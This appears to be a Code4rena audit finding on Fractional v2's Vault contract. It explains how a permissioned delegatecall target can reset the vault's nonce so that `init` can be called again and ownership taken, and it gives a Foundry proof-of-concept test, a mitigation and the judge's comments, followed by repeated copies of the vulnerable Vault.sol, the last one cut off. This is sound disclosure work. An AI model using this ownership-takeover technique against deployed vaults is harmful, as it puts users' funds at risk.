{
  "Title": "[M-01] Delegate call in `Vault#_execute` can alter Vault's ownership",
  "Content": "_Submitted by byterocket, also found by 242, &#95;141345&#95;, 0x1f8b, ACai, ayeslick, berndartmueller, BradMoon, cccz, Chom, giovannidisiena, infosec&#95;us&#95;team, Lambda, minhtrng, nine9, oyc&#95;109, PwnedNoMore, reassor, scaraven, slywaters, sseefried, tofunmi, Twpony, and unforgiven_\n\n<https://github.com/code-423n4/2022-07-fractional/blob/main/src/Vault.sol#L62>\n\n<https://github.com/code-423n4/2022-07-fractional/blob/main/src/Vault.sol#L126>\n\n<https://github.com/code-423n4/2022-07-fractional/blob/main/src/Vault.sol#L25>\n\n### Impact\n\nThe `Vault#execute` function calls a target contract's function via `delegatecall` if the caller is either the owner of the Vault or the target contract is part of a merkle tree, indicating a permission to call the target contract.\n\n```solidity\n// Check that the caller is either a module with permission to call or the owner.\nif (!MerkleProof.verify(_proof, merkleRoot, leaf)) {\n    if (msg.sender != owner)\n        revert NotAuthorized(msg.sender, _target, selector);\n}\n```\n\n*(See [Vault#execute](https://github.com/code-423n4/2022-07-fractional/blob/main/src/Vault.sol#L62))*\n\nIf the checks succeed, the internal `_execute()` function is used to execute the call via `delegatecall`.\n\n`delegatecall`s have to be used with caution because the contract being called is using the caller's contract storage, i.e. the callee contract can alter the caller's contract state (for more info, see [Solidity docs](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html?highlight=delegatecall#delegatecall-callcode-and-libraries)).\n\nThe developers seem to be aware of the danger that the callee contract is able to overtake the Vaults ownership, by changing the Vaults `owner` variable, as the `owner` is cached before the `delegatecall` and afterwards checked that the variable did not change:\n\n```solidity\n// ...\naddress owner_ = owner;\n// ...\n(success, response) = _target.delegatecall{gas:stipend}(_data);\nif (owner_ != owner) revert OwnerChanged(owner_, owner);\n// ...\n```\n\n*(See [Vault#\\_execute](https://github.com/code-423n4/2022-07-fractional/blob/main/src/Vault.sol#L126))*\n\nHowever, changing the `owner` variable is not the only way the callee contract is able to overtake the Vaults ownership. If the `nonce` variable is re-set to `0`, the Vault's `init` function becomes callable again, granting ownership to the caller:\n\n```solidity\nfunction init() external {\n    if (nonce != 0) revert Initialized(owner, msg.sender, nonce);\n    nonce = 1;\n    owner = msg.sender;\n}\n```\n\n*(See [Vault#init](https://github.com/code-423n4/2022-07-fractional/blob/main/src/Vault.sol#L25))*\n\nNote that other storage variables (i.e. `merkleRoot` and `methods`) could also be altered, but this would not lead to a loss in ownership, i.e. the project could re-set the variables.\n\nNevertheless, a contract trying, due to being malicious or faulty, to change the Vaults ownership first needs to be permissioned by the owner by adding it to the merkle tree. Otherwise, the contract can not be called.\n\nDue to the fact that the `owner` variable check is included, meaning **the project rates operational management already as being error-prone**, and the high number of security issues in connection to faulty usage of `delegatecall`, the severity is rated as MEDIUM (HIGH impact with a LOW likelihood).\n\n### Proof of Concept\n\nAdd the following code to the `test/Vault.t.sol` file and run `forge test --match-test \"testExecuteNoRevertIfReinitialized\" -vvvv`.\n\nIf the test succeeds, the Vault got re-initialized due to a `delegatecall` altering the Vault's `nonce` variable.\n\n```solidity\n// Inside contract VaultTest.\nfunction testExecuteNoRevertIfReinitialized() public {\n    vaultProxy.init(); // address(this) is owner\n    HackyTargetContract targetContract = new HackyTargetContract();\n    bytes32[] memory proof = new bytes32[](1);\n    bytes memory data = abi.encodeCall(\n        targetContract.changeNonce,\n        ()\n    );\n\n    // Note that the call does NOT revert.\n    vaultProxy.execute(address(targetContract), data, proof);\n\n    // Note that the Vault can now be re-initialized as the execute\n    // call above set the Vault's nonce to zero.\n    vm.prank(address(1));\n    vaultProxy.init();\n\n    assertEq(vaultProxy.owner(), address(1));\n}\n\n// Outside contract VaultTest.\ncontract HackyTargetContract {\n    address public gap_owner;\n    bytes32 public gap_merkleRoot;\n\n    uint256 public nonce;\n\n    function changeNonce() public {\n        nonce = 0;\n    }\n}\n```\n\n### Recommended Mitigation Steps\n\nCheck the `nonce` variable before and after the `delegatecall` inside the `_execute()` function as well, e.g.:\n\n```solidity\naddress owner_ = owner;\nuint256 nonce_ = nonce;\n\n// Execute delegatecall\n\nif (owner_ != owner || nonce_ != nonce) {\n    revert InvalidStateChange();\n}\n\n// ...\n```\n\n**[mehtaculous (Fractional) confirmed](https://github.com/code-423n4/2022-07-fractional-findings/issues/535)** \n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-07-fractional-findings/issues/487#issuecomment-1196108703):**\n > Due to the use of delegate call, `execute` and/or the fallback function could lead to changing the proxy's storage or even self destructing the proxy instance. If this were to happen, users funds could be put at risk. These attacks are predicated on the current vault owner to maliciously or unintentionally directly call or approve the calling of a malicious plugin -- because of this, I agree with the warden here that this is a Medium risk issue.\n\n\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/contests/2022-07-fractional-v2-contest",
  "Code": [
    {
      "filename": "src/Vault.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IVault} from \"./interfaces/IVault.sol\";\nimport {MerkleProof} from \"@openzeppelin/contracts/utils/cryptography/MerkleProof.sol\";\nimport {NFTReceiver} from \"./utils/NFTReceiver.sol\";\n\n/// @title Vault\n/// @author Fractional Art\n/// @notice Proxy contract for storing fractionalized assets\ncontract Vault is IVault, NFTReceiver {\n    /// @notice Address of vault owner\n    address public owner;\n    /// @notice Merkle root hash of vault permissions\n    bytes32 public merkleRoot;\n    /// @notice Initializer value\n    uint256 public nonce;\n    /// @dev Minimum reserve of gas units\n    uint256 private constant MIN_GAS_RESERVE = 5_000;\n    /// @notice Mapping of function selector to plugin address\n    mapping(bytes4 => address) public methods;\n\n    /// @dev Initializes nonce and proxy owner\n    function init() external {\n        if (nonce != 0) revert Initialized(owner, msg.sender, nonce);\n        nonce = 1;\n        owner = msg.sender;\n        emit TransferOwnership(address(0), msg.sender);\n    }\n\n    /// @dev Callback for receiving Ether when the calldata is empty\n    receive() external payable {}\n\n    /// @dev Callback for handling plugin transactions\n    /// @param _data Transaction data\n    /// @return response Return data from executing plugin\n    // prettier-ignore\n    fallback(bytes calldata _data) external payable returns (bytes memory response) {\n        address plugin = methods[msg.sig];\n        (,response) = _execute(plugin, _data);\n    }\n\n    /// @notice Executes vault transactions through delegatecall\n    /// @param _target Target address\n    /// @param _data Transaction data\n    /// @param _proof Merkle proof of permission hash\n    /// @return success Result status of delegatecall\n    /// @return response Return data of delegatecall\n    function execute(\n        address _target,\n        bytes calldata _data,\n        bytes32[] calldata _proof\n    ) external payable returns (bool success, bytes memory response) {\n        bytes4 selector;\n        assembly {\n            selector := calldataload(_data.offset)\n        }\n\n        // Generate leaf node by hashing module, target and function selector.\n        bytes32 leaf = keccak256(abi.encode(msg.sender, _target, selector));\n        // Check that the caller is either a module with permission to call or the owner.\n        if (!MerkleProof.verify(_proof, merkleRoot, leaf)) {\n            if (msg.sender != owner)\n                revert NotAuthorized(msg.sender, _target, selector);\n        }\n\n        (success, response) = _execute(_target, _data);\n    }\n\n    /// @notice Installs plugin by setting function selector to contract address\n    /// @param _selectors List of function selectors\n    /// @param _plugins Addresses of plugin contracts\n    function install(bytes4[] memory _selectors, address[] memory _plugins)\n        external\n    {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        uint256 length = _selectors.length;\n        for (uint256 i = 0; i < length; i++) {\n            methods[_selectors[i]] = _plugins[i];\n        }\n        emit InstallPlugin(_selectors, _plugins);\n    }\n\n    /// @notice Sets merkle root of vault permissions\n    /// @param _rootHash Hash of merkle root\n    function setMerkleRoot(bytes32 _rootHash) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        merkleRoot = _rootHash;\n    }\n\n    /// @notice Transfers ownership to given account\n    /// @param _newOwner Address of new owner\n    function transferOwnership(address _newOwner) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        owner = _newOwner;\n        emit TransferOwnership(msg.sender, _newOwner);\n    }\n\n    /// @notice Uninstalls plugin by setting function selector to zero address\n    /// @param _selectors List of function selectors\n    function uninstall(bytes4[] memory _selectors) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        uint256 length = _selectors.length;\n        for (uint256 i = 0; i < length; i++) {\n            methods[_selectors[i]] = address(0);\n        }\n        emit UninstallPlugin(_selectors);\n    }\n\n    /// @notice Executes plugin transactions through delegatecall\n    /// @param _target Target address\n    /// @param _data Transaction data\n    /// @return success Result status of delegatecall\n    /// @return response Return data of delegatecall\n    function _execute(address _target, bytes calldata _data)\n        internal\n        returns (bool success, bytes memory response)\n    {\n        // Check that the target is a valid contract\n        uint256 codeSize;\n        assembly {\n            codeSize := extcodesize(_target)\n        }\n        if (codeSize == 0) revert TargetInvalid(_target);\n        // Save the owner address in memory to ensure that it cannot be modified during the DELEGATECALL\n        address owner_ = owner;\n        // Reserve some gas to ensure that the function has enough to finish the execution\n        uint256 stipend = gasleft() - MIN_GAS_RESERVE;\n\n        // Delegate call to the target contract\n        (success, response) = _target.delegatecall{gas: stipend}(_data);\n        if (owner_ != owner) revert OwnerChanged(owner_, owner);\n\n        // Revert if execution was unsuccessful\n        if (!success) {\n            if (response.length == 0) revert ExecutionReverted();\n            _revertedWithReason(response);\n        }\n    }\n\n    /// @notice Reverts transaction with reason\n    function _revertedWithReason(bytes memory _response) internal pure {\n        assembly {\n            let returndata_size := mload(_response)\n            revert(add(32, _response), returndata_size)\n        }\n    }\n}"
    },
    {
      "filename": "src/Vault.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IVault} from \"./interfaces/IVault.sol\";\nimport {MerkleProof} from \"@openzeppelin/contracts/utils/cryptography/MerkleProof.sol\";\nimport {NFTReceiver} from \"./utils/NFTReceiver.sol\";\n\n/// @title Vault\n/// @author Fractional Art\n/// @notice Proxy contract for storing fractionalized assets\ncontract Vault is IVault, NFTReceiver {\n    /// @notice Address of vault owner\n    address public owner;\n    /// @notice Merkle root hash of vault permissions\n    bytes32 public merkleRoot;\n    /// @notice Initializer value\n    uint256 public nonce;\n    /// @dev Minimum reserve of gas units\n    uint256 private constant MIN_GAS_RESERVE = 5_000;\n    /// @notice Mapping of function selector to plugin address\n    mapping(bytes4 => address) public methods;\n\n    /// @dev Initializes nonce and proxy owner\n    function init() external {\n        if (nonce != 0) revert Initialized(owner, msg.sender, nonce);\n        nonce = 1;\n        owner = msg.sender;\n        emit TransferOwnership(address(0), msg.sender);\n    }\n\n    /// @dev Callback for receiving Ether when the calldata is empty\n    receive() external payable {}\n\n    /// @dev Callback for handling plugin transactions\n    /// @param _data Transaction data\n    /// @return response Return data from executing plugin\n    // prettier-ignore\n    fallback(bytes calldata _data) external payable returns (bytes memory response) {\n        address plugin = methods[msg.sig];\n        (,response) = _execute(plugin, _data);\n    }\n\n    /// @notice Executes vault transactions through delegatecall\n    /// @param _target Target address\n    /// @param _data Transaction data\n    /// @param _proof Merkle proof of permission hash\n    /// @return success Result status of delegatecall\n    /// @return response Return data of delegatecall\n    function execute(\n        address _target,\n        bytes calldata _data,\n        bytes32[] calldata _proof\n    ) external payable returns (bool success, bytes memory response) {\n        bytes4 selector;\n        assembly {\n            selector := calldataload(_data.offset)\n        }\n\n        // Generate leaf node by hashing module, target and function selector.\n        bytes32 leaf = keccak256(abi.encode(msg.sender, _target, selector));\n        // Check that the caller is either a module with permission to call or the owner.\n        if (!MerkleProof.verify(_proof, merkleRoot, leaf)) {\n            if (msg.sender != owner)\n                revert NotAuthorized(msg.sender, _target, selector);\n        }\n\n        (success, response) = _execute(_target, _data);\n    }\n\n    /// @notice Installs plugin by setting function selector to contract address\n    /// @param _selectors List of function selectors\n    /// @param _plugins Addresses of plugin contracts\n    function install(bytes4[] memory _selectors, address[] memory _plugins)\n        external\n    {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        uint256 length = _selectors.length;\n        for (uint256 i = 0; i < length; i++) {\n            methods[_selectors[i]] = _plugins[i];\n        }\n        emit InstallPlugin(_selectors, _plugins);\n    }\n\n    /// @notice Sets merkle root of vault permissions\n    /// @param _rootHash Hash of merkle root\n    function setMerkleRoot(bytes32 _rootHash) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        merkleRoot = _rootHash;\n    }\n\n    /// @notice Transfers ownership to given account\n    /// @param _newOwner Address of new owner\n    function transferOwnership(address _newOwner) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        owner = _newOwner;\n        emit TransferOwnership(msg.sender, _newOwner);\n    }\n\n    /// @notice Uninstalls plugin by setting function selector to zero address\n    /// @param _selectors List of function selectors\n    function uninstall(bytes4[] memory _selectors) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        uint256 length = _selectors.length;\n        for (uint256 i = 0; i < length; i++) {\n            methods[_selectors[i]] = address(0);\n        }\n        emit UninstallPlugin(_selectors);\n    }\n\n    /// @notice Executes plugin transactions through delegatecall\n    /// @param _target Target address\n    /// @param _data Transaction data\n    /// @return success Result status of delegatecall\n    /// @return response Return data of delegatecall\n    function _execute(address _target, bytes calldata _data)\n        internal\n        returns (bool success, bytes memory response)\n    {\n        // Check that the target is a valid contract\n        uint256 codeSize;\n        assembly {\n            codeSize := extcodesize(_target)\n        }\n        if (codeSize == 0) revert TargetInvalid(_target);\n        // Save the owner address in memory to ensure that it cannot be modified during the DELEGATECALL\n        address owner_ = owner;\n        // Reserve some gas to ensure that the function has enough to finish the execution\n        uint256 stipend = gasleft() - MIN_GAS_RESERVE;\n\n        // Delegate call to the target contract\n        (success, response) = _target.delegatecall{gas: stipend}(_data);\n        if (owner_ != owner) revert OwnerChanged(owner_, owner);\n\n        // Revert if execution was unsuccessful\n        if (!success) {\n            if (response.length == 0) revert ExecutionReverted();\n            _revertedWithReason(response);\n        }\n    }\n\n    /// @notice Reverts transaction with reason\n    function _revertedWithReason(bytes memory _response) internal pure {\n        assembly {\n            let returndata_size := mload(_response)\n            revert(add(32, _response), returndata_size)\n        }\n    }\n}"
    },
    {
      "filename": "src/Vault.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IVault} from \"./interfaces/IVault.sol\";\nimport {MerkleProof} from \"@openzeppelin/contracts/utils/cryptography/MerkleProof.sol\";\nimport {NFTReceiver} from \"./utils/NFTReceiver.sol\";\n\n/// @title Vault\n/// @author Fractional Art\n/// @notice Proxy contract for storing fractionalized assets\ncontract Vault is IVault, NFTReceiver {\n    /// @notice Address of vault owner\n    address public owner;\n    /// @notice Merkle root hash of vault permissions\n    bytes32 public merkleRoot;\n    /// @notice Initializer value\n    uint256 public nonce;\n    /// @dev Minimum reserve of gas units\n    uint256 private constant MIN_GAS_RESERVE = 5_000;\n    /// @notice Mapping of function selector to plugin address\n    mapping(bytes4 => address) public methods;\n\n    /// @dev Initializes nonce and proxy owner\n    function init() external {\n        if (nonce != 0) revert Initialized(owner, msg.sender, nonce);\n        nonce = 1;\n        owner = msg.sender;\n        emit TransferOwnership(address(0), msg.sender);\n    }\n\n    /// @dev Callback for receiving Ether when the calldata is empty\n    receive() external payable {}\n\n    /// @dev Callback for handling plugin transactions\n    /// @param _data Transaction data\n    /// @return response Return data from executing plugin\n    // prettier-ignore\n    fallback(bytes calldata _data) external payable returns (bytes memory response) {\n        address plugin = methods[msg.sig];\n        (,response) = _execute(plugin, _data);\n    }\n\n    /// @notice Executes vault transactions through delegatecall\n    /// @param _target Target address\n    /// @param _data Transaction data\n    /// @param _proof Merkle proof of permission hash\n    /// @return success Result status of delegatecall\n    /// @return response Return data of delegatecall\n    function execute(\n        address _target,\n        bytes calldata _data,\n        bytes32[] calldata _proof\n    ) external payable returns (bool success, bytes memory response) {\n        bytes4 selector;\n        assembly {\n            selector := calldataload(_data.offset)\n        }\n\n        // Generate leaf node by hashing module, target and function selector.\n        bytes32 leaf = keccak256(abi.encode(msg.sender, _target, selector));\n        // Check that the caller is either a module with permission to call or the owner.\n        if (!MerkleProof.verify(_proof, merkleRoot, leaf)) {\n            if (msg.sender != owner)\n                revert NotAuthorized(msg.sender, _target, selector);\n        }\n\n        (success, response) = _execute(_target, _data);\n    }\n\n    /// @notice Installs plugin by setting function selector to contract address\n    /// @param _selectors List of function selectors\n    /// @param _plugins Addresses of plugin contracts\n    function install(bytes4[] memory _selectors, address[] memory _plugins)\n        external\n    {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        uint256 length = _selectors.length;\n        for (uint256 i = 0; i < length; i++) {\n            methods[_selectors[i]] = _plugins[i];\n        }\n        emit InstallPlugin(_selectors, _plugins);\n    }\n\n    /// @notice Sets merkle root of vault permissions\n    /// @param _rootHash Hash of merkle root\n    function setMerkleRoot(bytes32 _rootHash) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        merkleRoot = _rootHash;\n    }\n\n    /// @notice Transfers ownership to given account\n    /// @param _newOwner Address of new owner\n    function transferOwnership(address _newOwner) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        owner = _newOwner;\n        emit TransferOwnership(msg.sender, _newOwner);\n    }\n\n    /// @notice Uninstalls plugin by setting function selector to zero address\n    /// @param _selectors List of function selectors\n    function uninstall(bytes4[] memory _selectors) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        uint256 length = _selectors.length;\n        for (uint256 i = 0; i < length; i++) {\n            methods[_selectors[i]] = address(0);\n        }\n        emit UninstallPlugin(_selectors);\n    }\n\n    /// @notice Executes plugin transactions through delegatecall\n    /// @param _target Target address\n    /// @param _data Transaction data\n    /// @return success Result status of delegatecall\n    /// @return response Return data of delegatecall\n    function _execute(address _target, bytes calldata _data)\n        internal\n        returns (bool success, bytes memory response)\n    {\n        // Check that the target is a valid contract\n        uint256 codeSize;\n        assembly {\n            codeSize := extcodesize(_target)\n        }\n        if (codeSize == 0) revert TargetInvalid(_target);\n        // Save the owner address in memory to ensure that it cannot be modified during the DELEGATECALL\n        address owner_ = owner;\n        // Reserve some gas to ensure that the function has enough to finish the execution\n        uint256 stipend = gasleft() - MIN_GAS_RESERVE;\n\n        // Delegate call to the target contract\n        (success, response) = _target.delegatecall{gas: stipend}(_data);\n        if (owner_ != owner) revert OwnerChanged(owner_, owner);\n\n        // Revert if execution was unsuccessful\n        if (!success) {\n            if (response.length == 0) revert ExecutionReverted();\n            _revertedWithReason(response);\n        }\n    }\n\n    /// @notice Reverts transaction with reason\n    function _revertedWithReason(bytes memory _response) internal pure {\n        assembly {\n            let returndata_size := mload(_response)\n            revert(add(32, _response), returndata_size)\n        }\n    }\n}"
    },
    {
      "filename": "src/Vault.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IVault} from \"./interfaces/IVault.sol\";\nimport {MerkleProof} from \"@openzeppelin/contracts/utils/cryptography/MerkleProof.sol\";\nimport {NFTReceiver} from \"./utils/NFTReceiver.sol\";\n\n/// @title Vault\n/// @author Fractional Art\n/// @notice Proxy contract for storing fractionalized assets\ncontract Vault is IVault, NFTReceiver {\n    /// @notice Address of vault owner\n    address public owner;\n    /// @notice Merkle root hash of vault permissions\n    bytes32 public merkleRoot;\n    /// @notice Initializer value\n    uint256 public nonce;\n    /// @dev Minimum reserve of gas units\n    uint256 private constant MIN_GAS_RESERVE = 5_000;\n    /// @notice Mapping of function selector to plugin address\n    mapping(bytes4 => address) public methods;\n\n    /// @dev Initializes nonce and proxy owner\n    function init() external {\n        if (nonce != 0) revert Initialized(owner, msg.sender, nonce);\n        nonce = 1;\n        owner = msg.sender;\n        emit TransferOwnership(address(0), msg.sender);\n    }\n\n    /// @dev Callback for receiving Ether when the calldata is empty\n    receive() external payable {}\n\n    /// @dev Callback for handling plugin transactions\n    /// @param _data Transaction data\n    /// @return response Return data from executing plugin\n    // prettier-ignore\n    fallback(bytes calldata _data) external payable returns (bytes memory response) {\n        address plugin = methods[msg.sig];\n        (,response) = _execute(plugin, _data);\n    }\n\n    /// @notice Executes vault transactions through delegatecall\n    /// @param _target Target address\n    /// @param _data Transaction data\n    /// @param _proof Merkle proof of permission hash\n    /// @return success Result status of delegatecall\n    /// @return response Return data of delegatecall\n    function execute(\n        address _target,\n        bytes calldata _data,\n        bytes32[] calldata _proof\n    ) external payable returns (bool success, bytes memory response) {\n        bytes4 selector;\n        assembly {\n            selector := calldataload(_data.offset)\n        }\n\n        // Generate leaf node by hashing module, target and function selector.\n        bytes32 leaf = keccak256(abi.encode(msg.sender, _target, selector));\n        // Check that the caller is either a module with permission to call or the owner.\n        if (!MerkleProof.verify(_proof, merkleRoot, leaf)) {\n            if (msg.sender != owner)\n                revert NotAuthorized(msg.sender, _target, selector);\n        }\n\n        (success, response) = _execute(_target, _data);\n    }\n\n    /// @notice Installs plugin by setting function selector to contract address\n    /// @param _selectors List of function selectors\n    /// @param _plugins Addresses of plugin contracts\n    function install(bytes4[] memory _selectors, address[] memory _plugins)\n        external\n    {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        uint256 length = _selectors.length;\n        for (uint256 i = 0; i < length; i++) {\n            methods[_selectors[i]] = _plugins[i];\n        }\n        emit InstallPlugin(_selectors, _plugins);\n    }\n\n    /// @notice Sets merkle root of vault permissions\n    /// @param _rootHash Hash of merkle root\n    function setMerkleRoot(bytes32 _rootHash) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        merkleRoot = _rootHash;\n    }\n\n    /// @notice Transfers ownership to given account\n    /// @param _newOwner Address of new owner\n    function transferOwnership(address _newOwner) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        owner = _newOwner;\n        emit TransferOwnership(msg.sender, _newOwner);\n    }\n\n    /// @notice Uninstalls plugin by setting function selector to zero address\n    /// @param _selectors List of function selectors\n    function uninstall(bytes4[] memory _selectors) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        uint256 length = _selectors.length;\n        for (uint256 i = 0; i < length; i++) {\n            methods[_selectors[i]] = address(0);\n        }\n        emit UninstallPlugin(_selectors);\n    }\n\n    /// @notice Executes plugin transactions through delegatecall\n    /// @param _target Target address\n    /// @param _data Transaction data\n    /// @return success Result status of delegatecall\n    /// @return response Return data of delegatecall\n    function _execute(address _target, bytes calldata _data)\n        internal\n        returns (bool success, bytes memory response)\n    {\n        // Check that the target is a valid contract\n        uint256 codeSize;\n        assembly {\n            codeSize := extcodesize(_target)\n        }\n        if (codeSize == 0) revert TargetInvalid(_target);\n        // Save the owner address in memory to ensure that it cannot be modified during the DELEGATECALL\n        address owner_ = owner;\n        // Reserve some gas to ensure that the function has enough to finish the execution\n        uint256 stipend = gasleft() - MIN_GAS_RESERVE;\n\n        // Delegate call to the target contract\n        (success, response) = _target.delegatecall{gas: stipend}(_data);\n        if (owner_ != owner) revert OwnerChanged(owner_, owner);\n\n        // Revert if execution was unsuccessful\n        if (!success) {\n            if (response.length == 0) revert ExecutionReverted();\n            _revertedWithReason(response);\n        }\n    }\n\n    /// @notice Reverts transaction with reason\n    function _revertedWithReason(bytes memory _response) internal pure {\n        assembly {\n            let returndata_size := mload(_response)\n            revert(add(32, _response), returndata_size)\n        }\n    }\n}"
    },
    {
      "filename": "src/Vault.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IVault} from \"./interfaces/IVault.sol\";\nimport {MerkleProof} from \"@openzeppelin/contracts/utils/cryptography/MerkleProof.sol\";\nimport {NFTReceiver} from \"./utils/NFTReceiver.sol\";\n\n/// @title Vault\n/// @author Fractional Art\n/// @notice Proxy contract for storing fractionalized assets\ncontract Vault is IVault, NFTReceiver {\n    /// @notice Address of vault owner\n    address public owner;\n    /// @notice Merkle root hash of vault permissions\n    bytes32 public merkleRoot;\n    /// @notice Initializer value\n    uint256 public nonce;\n    /// @dev Minimum reserve of gas units\n    uint256 private constant MIN_GAS_RESERVE = 5_000;\n    /// @notice Mapping of function selector to plugin address\n    mapping(bytes4 => address) public methods;\n\n    /// @dev Initializes nonce and proxy owner\n    function init() external {\n        if (nonce != 0) revert Initialized(owner, msg.sender, nonce);\n        nonce = 1;\n        owner = msg.sender;\n        emit TransferOwnership(address(0), msg.sender);\n    }\n\n    /// @dev Callback for receiving Ether when the calldata is empty\n    receive() external payable {}\n\n    /// @dev Callback for handling plugin transactions\n    /// @param _data Transaction data\n    /// @return response Return data from executing plugin\n    // prettier-ignore\n    fallback(bytes calldata _data) external payable returns (bytes memory response) {\n        address plugin = methods[msg.sig];\n        (,response) = _execute(plugin, _data);\n    }\n\n    /// @notice Executes vault transactions through delegatecall\n    /// @param _target Target address\n    /// @param _data Transaction data\n    /// @param _proof Merkle proof of permission hash\n    /// @return success Result status of delegatecall\n    /// @return response Return data of delegatecall\n    function execute(\n        address _target,\n        bytes calldata _data,\n        bytes32[] calldata _proof\n    ) external payable returns (bool success, bytes memory response) {\n        bytes4 selector;\n        assembly {\n            selector := calldataload(_data.offset)\n        }\n\n        // Generate leaf node by hashing module, target and function selector.\n        bytes32 leaf = keccak256(abi.encode(msg.sender, _target, selector));\n        // Check that the caller is either a module with permission to call or the owner.\n        if (!MerkleProof.verify(_proof, merkleRoot, leaf)) {\n            if (msg.sender != owner)\n                revert NotAuthorized(msg.sender, _target, selector);\n        }\n\n        (success, response) = _execute(_target, _data);\n    }\n\n    /// @notice Installs plugin by setting function selector to contract address\n    /// @param _selectors List of function selectors\n    /// @param _plugins Addresses of plugin contracts\n    function install(bytes4[] memory _selectors, address[] memory _plugins)\n        external\n    {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        uint256 length = _selectors.length;\n        for (uint256 i = 0; i < length; i++) {\n            methods[_selectors[i]] = _plugins[i];\n        }\n        emit InstallPlugin(_selectors, _plugins);\n    }\n\n    /// @notice Sets merkle root of vault permissions\n    /// @param _rootHash Hash of merkle root\n    function setMerkleRoot(bytes32 _rootHash) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        merkleRoot = _rootHash;\n    }\n\n    /// @notice Transfers ownership to given account\n    /// @param _newOwner Address of new owner\n    function transferOwnership(address _newOwner) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        owner = _newOwner;\n        emit TransferOwnership(msg.sender, _newOwner);\n    }\n\n    /// @notice Uninstalls plugin by setting function selector to zero address\n    /// @param _selectors List of function selectors\n    function uninstall(bytes4[] memory _selectors) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        uint256 length = _selectors.length;\n        for (uint256 i = 0; i < length; i++) {\n            methods[_selectors[i]] = address(0);\n        }\n        emit UninstallPlugin(_selectors);\n    }\n\n    /// @notice Executes plugin transactions through delegatecall\n    /// @param _target Target address\n    /// @param _data Transaction data\n    /// @return success Result status of delegatecall\n    /// @return response Return data of delegatecall\n    function _execute(address _target, bytes calldata _data)\n        internal\n        returns (bool success, bytes memory response)\n    {\n        // Check that the target is a valid contract\n        uint256 codeSize;\n        assembly {\n            codeSize := extcodesize(_target)\n        }\n        if (codeSize == 0) revert TargetInvalid(_target);\n        // Save the owner address in memory to ensure that it cannot be modified during the DELEGATECALL\n        address owner_ = owner;\n        // Reserve some gas to ensure that the function has enough to finish the execution\n        uint256 stipend = gasleft() - MIN_GAS_RESERVE;\n\n        // Delegate call to the target contract\n        (success, response) = _target.delegatecall{gas: stipend}(_data);\n        if (owner_ != owner) revert OwnerChanged(owner_, owner);\n\n        // Revert if execution was unsuccessful\n        if (!success) {\n            if (response.length == 0) revert ExecutionReverted();\n            _revertedWithReason(response);\n        }\n    }\n\n    /// @notice Reverts transaction with reason\n    function _revertedWithReason(bytes memory _response) internal pure {\n        assembly {\n            let returndata_size := mload(_response)\n            revert(add(32, _response), returndata_size)\n        }\n    }\n}"
    },
    {
      "filename": "src/Vault.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IVault} from \"./interfaces/IVault.sol\";\nimport {MerkleProof} from \"@openzeppelin/contracts/utils/cryptography/MerkleProof.sol\";\nimport {NFTReceiver} from \"./utils/NFTReceiver.sol\";\n\n/// @title Vault\n/// @author Fractional Art\n/// @notice Proxy contract for storing fractionalized assets\ncontract Vault is IVault, NFTReceiver {\n    /// @notice Address of vault owner\n    address public owner;\n    /// @notice Merkle root hash of vault permissions\n    bytes32 public merkleRoot;\n    /// @notice Initializer value\n    uint256 public nonce;\n    /// @dev Minimum reserve of gas units\n    uint256 private constant MIN_GAS_RESERVE = 5_000;\n    /// @notice Mapping of function selector to plugin address\n    mapping(bytes4 => address) public methods;\n\n    /// @dev Initializes nonce and proxy owner\n    function init() external {\n        if (nonce != 0) revert Initialized(owner, msg.sender, nonce);\n        nonce = 1;\n        owner = msg.sender;\n        emit TransferOwnership(address(0), msg.sender);\n    }\n\n    /// @dev Callback for receiving Ether when the calldata is empty\n    receive() external payable {}\n\n    /// @dev Callback for handling plugin transactions\n    /// @param _data Transaction data\n    /// @return response Return data from executing plugin\n    // prettier-ignore\n    fallback(bytes calldata _data) external payable returns (bytes memory response) {\n        address plugin = methods[msg.sig];\n        (,response) = _execute(plugin, _data);\n    }\n\n    /// @notice Executes vault transactions through delegatecall\n    /// @param _target Target address\n    /// @param _data Transaction data\n    /// @param _proof Merkle proof of permission hash\n    /// @return success Result status of delegatecall\n    /// @return response Return data of delegatecall\n    function execute(\n        address _target,\n        bytes calldata _data,\n        bytes32[] calldata _proof\n    ) external payable returns (bool success, bytes memory response) {\n        bytes4 selector;\n        assembly {\n            selector := calldataload(_data.offset)\n        }\n\n        // Generate leaf node by hashing module, target and function selector.\n        bytes32 leaf = keccak256(abi.encode(msg.sender, _target, selector));\n        // Check that the caller is either a module with permission to call or the owner.\n        if (!MerkleProof.verify(_proof, merkleRoot, 